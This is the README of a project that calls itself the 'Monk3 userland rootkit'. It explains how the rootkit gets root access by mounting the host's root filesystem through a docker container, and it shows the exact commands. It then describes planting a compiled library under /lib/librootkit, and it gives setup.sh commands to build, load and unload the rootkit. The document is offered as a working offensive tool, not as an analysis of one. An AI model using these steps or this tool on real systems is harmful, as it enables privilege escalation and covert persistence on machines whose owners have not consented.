# Monk3 userland rootkit

## dependencies
<ul>
    <li>docker</li>
</ul>

# how does it work?
Monk3 uses docker to escalate privileges and have access to the user's file system by mounting the root directory into /mnt and accessing it.

example:
```
cd /
docker run -v /:/mnt -it alpine
cd mnt
ls
```
then creates /lib/librootkit/ where the compiled source (monk3.lib.so) will remain.
```
mkdir /lib/librootkit
mv monk3.lib.so /lib/librootkit/monk3.lib.so
```

# configuration guide
to compile and run monk3, just make sure you have docker installed and that your hostname belongs to the same group as docker does
(setup.sh does this for you)

### compile and run rootkit:
```
chmod u=rwx setup.sh
./setup.sh -b
```

### delete and unload rootkit:
```
chmod u=rwx setup.sh
./setup.sh -r
```
